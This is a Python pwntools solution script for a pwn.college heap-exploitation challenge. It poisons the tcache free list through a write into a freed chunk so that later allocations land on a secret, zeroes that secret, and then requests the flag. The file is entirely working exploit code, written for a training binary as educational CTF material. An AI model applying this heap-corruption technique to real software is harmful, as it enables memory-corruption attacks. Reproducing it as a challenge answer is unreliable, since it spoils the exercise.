# Dynamic Allocator Misuse - Seeking Substantial Secrets (Easy)
# https://pwn.college/program-security/dynamic-allocator-misuse/level-7-0
import pwn
from dojotool import find_challenge
from dojotool.pwntool import tee


def one_round(io: pwn.process):
    tee(io)
    addr = 0x426966

    def clean_qword(addr):
        io.sendline(b"malloc 0 16")
        io.sendline(b"malloc 1 16")
        io.sendline(b"free 0")
        io.sendline(b"free 1")
        io.sendline(b"scanf 1")
        io.sendline((addr - 0x8).to_bytes(4, "little"))
        io.sendline(b"malloc 0 16")
        io.sendline(b"malloc 0 16")

    clean_qword(addr + 0x0C)
    clean_qword(addr + 0x04)
    clean_qword(addr - 0x04)

    io.sendline(b"send_flag")
    io.sendline(b"\0" * 16)
    io.sendline(b"quit")
    io.recvrepeat()


def ctf():
    root_bin = find_challenge()
    with pwn.process(root_bin, raw=True, level="error") as io:
        one_round(io)


if __name__ == "__main__":
    ctf()
